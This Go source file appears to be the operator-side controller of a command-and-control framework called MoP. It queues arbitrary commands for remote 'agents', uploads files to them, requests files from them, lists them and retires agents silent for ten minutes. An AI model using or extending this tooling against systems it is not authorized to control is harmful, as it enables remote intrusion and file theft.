// CLI server controllers
package controllers

import (
	"MoP/src/db"
	"MoP/src/repos"
	"MoP/src/responses"
	"encoding/base64"
	"fmt"
	"os"
	"time"
)

func GetHistory(agent string, command []string) {
	db, err := db.Connect()
	if err != nil {
		return
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	hist, err := repo.History(agent, command)
	if err != nil {
		fmt.Println(err)
		return
	}

	for _, com := range hist {
		responses.HandleCommand(com)
	}
}

func ChangeAlias(agentID int, alias string) string {
	db, err := db.Connect()
	if err != nil {
		return "Error to connect to database!"
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	err = repo.UpdateAlias(agentID, alias)
	if err != nil {
		fmt.Println(err)
		return "Error to update alias!"
	}

	return fmt.Sprintf("\nAlias from Agent %d updated to %s!\n", agentID, alias)

}

func GetAgents() {
	db, err := db.Connect()
	if err != nil {
		return
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	agents, err := repo.Search()
	if err != nil {
		return
	}

	responses.PrintAgents(agents)
}

func CheckAgents(agentID uint64) bool {
	db, err := db.Connect()
	if err != nil {
		return false
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	agent, err := repo.CheckAgent(agentID)
	if err != nil {
		return false
	}

	return agent
}

func AgentsToKill() []int {
	db, err := db.Connect()
	if err != nil {
		return nil
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	agents, err := repo.SearchAgentTimeCreated()
	if err != nil {
		return nil
	}

	var agetnsToKill []int
	for _, agent := range agents {
		tn := time.Now()
		td := tn.Sub(agent.CreatedAt).Minutes()
		if td > 10 {
			agetnsToKill = append(agetnsToKill, int(agent.ID))
		}
		
	}

	return agetnsToKill
}

func KillAgent(ID int) string {
	db, err := db.Connect()
	if err != nil {
		return fmt.Sprintf("Error to connect to DB: %s", err)
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	err = repo.KillAgent(ID)
	if err != nil {
		return fmt.Sprintf("Error to kill agent %d: %s", ID, err)
	}

	return fmt.Sprintf("\nAgent %d killed due 10 minutes whothout communication!", ID)
}

func SendCommand(ID uint64, command string) {
	db, err := db.Connect()
	if err != nil {
		return
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	repo.Command(ID, command)
}


func SendFile(ID uint64, filePath string, fileName string) error {
	fileOpened, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	file := base64.StdEncoding.EncodeToString(fileOpened)

	db, err := db.Connect()
	if err != nil {
		return err
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	err = repo.FileRequest(ID, file, fileName, filePath, "upload")
	if err != nil {
		return err
	}

	return nil
}

func ReqFile(ID uint64, filePath string, fileName string, action string) error {
	db, err := db.Connect()
	if err != nil {
		return err
	}
	defer db.Close()

	repo := repos.AgentRepo(db)
	err = repo.FileRequest(ID, "MoP", fileName, filePath, action)
	if err != nil {
		return err
	}

	return nil

}